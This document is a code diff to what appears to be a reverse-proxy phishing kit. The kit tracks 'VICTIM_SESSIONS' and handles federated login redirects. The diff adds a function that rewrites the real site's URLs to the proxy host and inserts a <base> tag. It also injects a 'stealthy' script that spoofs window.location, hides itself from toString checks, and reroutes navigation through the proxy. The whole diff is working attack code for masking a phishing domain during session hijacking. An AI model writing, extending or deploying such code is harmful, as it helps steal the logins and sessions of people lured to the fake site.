@@ -586,7 +586,7 @@ const caption =
         const cleanedBuffer = Buffer.from(html);
 
         // ---- STATIC injection (original method) ----
-        serverResponseBody = injectDomainMask(cleanedBuffer, currentSession, VICTIM_SESSIONS);
+        serverResponseBody = processHtmlResponse(cleanedBuffer, currentSession, VICTIM_SESSIONS, proxyHostname);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
         if (proxyResponse.headers["content-length"]) {
@@ -1252,76 +1252,105 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
 }
 
-function injectDomainMask(htmlBuffer, sessionId, sessions) {
-  const session = sessions[sessionId];
-  if (!session) return htmlBuffer;
+function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
+    const session = sessions[sessionId];
+    if (!session) return htmlBuffer;
 
-  const realHost = session.hostname;
-  const realProtocol = session.protocol;
-  const realOrigin = `${realProtocol}//${realHost}`;
+    const realHost = session.hostname;
+    const realProtocol = session.protocol;
+    const realOrigin = `${realProtocol}//${realHost}`;
+    const proxyOrigin = `https://${proxyHostname}`;
 
-  const script = `
-    (function() {
-      // 1. Create a fake but complete location object
-      const fakeLocation = new Proxy({}, {
-        get: function(target, prop) {
-          const realValue = window.location[prop];
-          if (prop === 'hostname') return '${realHost}';
-          if (prop === 'origin') return '${realOrigin}';
-          if (prop === 'protocol') return '${realProtocol}';
-          if (prop === 'host') return '${realHost}';
-          return typeof realValue === 'function' ? realValue.bind(window.location) : realValue;
-        },
-        set: function() { return true; }
-      });
+    // ---- 1. REWRITE ABSOLUTE URLS IN THE HTML ----
+    let html = htmlBuffer.toString('utf8');
 
-      // 2. Proxy the global window object
-      const realWindow = window;
-      window = new Proxy(window, {
-        get: function(target, prop) {
-          if (prop === 'location') return fakeLocation;
-          const value = target[prop];
-          return typeof value === 'function' ? value.bind(target) : value;
-        },
-        set: function(target, prop, value) {
-          if (prop === 'location') return true;
-          target[prop] = value;
-          return true;
+    // Replace all absolute references to the real host
+    const hostRegex = new RegExp(`https?:\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
+    html = html.replace(hostRegex, proxyOrigin);
+
+    // Replace protocol-relative references (//realhost.domain)
+    const protoRelRegex = new RegExp(`\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
+    html = html.replace(protoRelRegex, `//${proxyHostname}`);
+
+    // ---- 2. INJECT <base> TAG TO HANDLE RELATIVE URLS ----
+    const baseTag = `<base href="${proxyOrigin}/">`;
+
+    // ---- 3. BUILD THE DOMAIN MASK SCRIPT (stealthy Proxy) ----
+    const maskScript = `
+        (function() {
+            const fakeLocation = new Proxy({}, {
+                get: function(target, prop) {
+                    const realValue = window.location[prop];
+                    if (prop === 'hostname') return '${realHost}';
+                    if (prop === 'origin') return '${realOrigin}';
+                    if (prop === 'protocol') return '${realProtocol}';
+                    if (prop === 'host') return '${realHost}';
+                    // Intercept navigation methods
+                    if (prop === 'replace' || prop === 'assign') {
+                        return function(url) {
+                            const rewritten = url.toString().replace('${realHost}', '${proxyHostname}');
+                            return realValue.call(window.location, rewritten);
+                        };
+                    }
+                    return typeof realValue === 'function' ? realValue.bind(window.location) : realValue;
+                },
+                set: function() { return true; }
+            });
+
+            const realWindow = window;
+            window = new Proxy(window, {
+                get: function(target, prop) {
+                    if (prop === 'location') return fakeLocation;
+                    const value = target[prop];
+                    return typeof value === 'function' ? value.bind(target) : value;
+                },
+                set: function(target, prop, value) {
+                    if (prop === 'location') {
+                        // Rewrite the URL before navigation
+                        const newUrl = value.toString();
+                        const rewritten = newUrl.replace('${realHost}', '${proxyHostname}');
+                        // Navigate to rewritten URL (but we must avoid infinite loop)
+                        window.location.href = rewritten;
+                        return true;
+                    }
+                    target[prop] = value;
+                    return true;
+                }
+            });
+
+            Object.defineProperty(realWindow, 'window', { get: () => window, configurable: false });
+            Object.defineProperty(realWindow, 'self', { get: () => window, configurable: false });
+            Object.defineProperty(realWindow, 'globalThis', { get: () => window, configurable: false });
+
+            window.toString = function() { return '[object Window]'; };
+            delete window.hasOwnProperty && Object.setPrototypeOf(window.toString, Function.prototype);
+        })();
+    `;
+
+    // ---- 4. KEEP YOUR EXISTING STATIC SCRIPT INJECTION ----
+    // This is exactly what your old updateHTMLProxyResponse did.
+    const staticScript = '<script src="/@"></script>';
+
+    // ---- 5. COMBINE EVERYTHING INTO ONE PAYLOAD ----
+    // Inject <base> first, then the mask, then the static script.
+    const fullPayload = `${baseTag}<script>${maskScript}</script>${staticScript}`;
+
+    // ---- 6. INJECT INTO <head> OR <body> ----
+    const injectionMap = {
+        "<head>": `<head>${fullPayload}`,
+        "<html>": `<html><head>${fullPayload}</head>`,
+        "<body>": `<head>${fullPayload}</head><body>`
+    };
+    const limit = 200;
+    for (const [tag, replacement] of Object.entries(injectionMap)) {
+        const tagBuf = Buffer.from(tag);
+        const pos = Buffer.from(html).subarray(0, limit).indexOf(tagBuf);
+        if (pos !== -1) {
+            const before = Buffer.from(html.substring(0, pos));
+            const after = Buffer.from(html.substring(pos + tag.length));
+            return Buffer.concat([before, Buffer.from(replacement), after]);
         }
-      });
-
-      // 3. Also proxy global references
-      const proxyWindow = window;
-      Object.defineProperty(realWindow, 'window', { get: () => proxyWindow, configurable: false });
-      Object.defineProperty(realWindow, 'self', { get: () => proxyWindow, configurable: false });
-      Object.defineProperty(realWindow, 'globalThis', { get: () => proxyWindow, configurable: false });
-
-      // 4. Prevent toString detection
-      window.toString = function() { return '[object Window]'; };
-      delete window.hasOwnProperty && Object.setPrototypeOf(window.toString, Function.prototype);
-    })();
-  `;
-
-  const payload = `<script>${script}</script>`;
-
-  // Injection logic (same as your old updateHTMLProxyResponse)
-  const injectionMap = {
-    "<head>": `<head>${payload}`,
-    "<html>": `<html><head>${payload}</head>`,
-    "<body>": `<head>${payload}</head><body>`
-  };
-  const limit = 200;
-  for (const [tag, replacement] of Object.entries(injectionMap)) {
-    const tagBuf = Buffer.from(tag);
-    const pos = htmlBuffer.subarray(0, limit).indexOf(tagBuf);
-    if (pos !== -1) {
-      return Buffer.concat([
-        htmlBuffer.subarray(0, pos),
-        Buffer.from(replacement),
-        htmlBuffer.subarray(pos + tagBuf.length)
-      ]);
     }
-  }
-  // Fallback: prepend
-  return Buffer.concat([Buffer.from(`<head>${payload}</head>`), htmlBuffer]);
+    // Fallback: prepend
+    return Buffer.concat([Buffer.from(`<head>${fullPayload}</head>`), Buffer.from(html)]);
 }
